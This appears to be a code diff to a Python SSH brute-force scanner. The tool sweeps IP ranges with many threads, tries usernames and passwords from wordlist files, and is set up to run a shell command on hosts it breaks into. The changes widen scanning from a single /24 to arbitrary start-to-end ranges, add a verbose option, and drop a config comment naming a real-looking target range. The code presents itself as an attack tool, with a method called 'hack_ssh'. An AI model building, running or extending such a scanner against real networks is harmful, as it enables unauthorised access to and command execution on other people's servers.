@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import configparser
 import fire
 import signal
@@ -9,14 +11,6 @@ from socket import *
 import time
 from threading import Thread
 
-# enable=true
-# iprange=78.13.240
-# userfile=sshusr.txt
-# passwfile=sshpsw.txt
-# linuxshellcode=whoami
-# port=22
-# max_thread=10
-# timeout=3
 ssh_scan = None
 def signal_handler(sig, frame):
     print('You pressed Ctrl+C!')
@@ -30,6 +24,7 @@ signal.signal(signal.SIGINT, signal_handler)
 
 SSH_STATE = {"RUNNING":1,"END":0, "IDLE":2}
 
+
 class SSHScan():
 
     def __init__(self, 
@@ -37,6 +32,7 @@ class SSHScan():
                  end_ip, 
                  user_file, 
                  password_file,
+                 verbose,
                  ssh_port,
                  max_thread,
                  timeout,
@@ -48,6 +44,7 @@ class SSHScan():
         self.end_ip = end_ip 
         self.user_ssh_file = user_file
         self.pass_ssh_file = password_file 
+        self.verbose = verbose
         self.user_list = []
         self.pass_list = []
         self.ssh_linux_shellcode = command 
@@ -69,22 +66,46 @@ class SSHScan():
     def stop(self):
         self.forced_exit = True
 
+    def _incIP(self,ip):
+        a,b,c,d = ip.split(".")
+
+        a=int(a)
+        b=int(b)
+        c=int(c)
+        d=int(d)
+
+        if d<255:
+            d=d+1
+        elif c<255:
+            c=c+1
+            d=0
+        elif b<255:
+            b=b+1
+            d=0
+            c=0
+        elif a<255:
+            a=a+1
+            d=0
+            c=0
+            b=0
+        return "{}.{}.{}.{}".format(a,b,c,d)
+
     def hack_ssh(self):
-        counter = 1
         print("Scanning for ssh services...")
-        while counter < 254:
+        while self.start_ip!=self.end_ip:
             if self.forced_exit:
                 return
 
             if len(self.thread_list)>=self.max_thread:
                 time.sleep(2)
             else:
-                ip = self.start_ip+"."+str(counter)
+                ip = self.start_ip
                 t = Thread(target=self._scan_ip, args=(ip,))
                 t.start()
                 self.thread_list[ip] = t
 
-            counter = counter+1
+
+            self.start_ip = self._incIP(self.start_ip)
 
         while len(self.thread_list)>0:
             time.sleep(3)
@@ -161,15 +182,18 @@ def scan(start_ip,
         end_ip,
         user_file,
         password_file, 
+        verbose=False,
         port=22, 
         max_thread=10, 
         timeout=3, 
         command=None):
+
     global ssh_scan 
     ssh_scan = SSHScan(start_ip,
                        end_ip,
                        user_file,
                        password_file,
+                       verbose,
                        port,
                        max_thread,
                        timeout,
